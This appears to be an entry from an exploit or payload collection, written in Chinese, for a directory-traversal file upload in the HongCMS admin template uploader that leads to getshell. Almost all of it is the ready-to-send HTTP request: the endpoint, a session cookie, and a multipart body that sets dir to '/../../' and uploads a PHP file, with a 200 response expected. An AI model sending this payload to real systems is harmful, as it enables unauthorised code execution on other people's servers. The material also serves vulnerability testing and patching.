# HongCMS目录穿越的后台模版文件上传造成的getshell

- **系统**：HongCMS　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /admin/index.php/template/upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMer1nJdT…`　`Cookie: PHPSESSID=mond1i21lhdga3uu95dl55t975; history=%5B%7B%22name%22%3A%22aaaaaaaaaaaa…`

**请求体 / payload**
```
------WebKitFormBoundaryMer1nJdTsRVrRPZ6
Content-Disposition: form-data; name="dir"
/../../
------WebKitFormBoundaryMer1nJdTsRVrRPZ6
Content-Disposition: form-data; name="file"; filename="dudesite.php"
Content-Type: application/octet-stream
<?php phpinfo(); ?>
------WebKitFormBoundaryMer1nJdTsRVrRPZ6--
```
- **预期**：200　|　—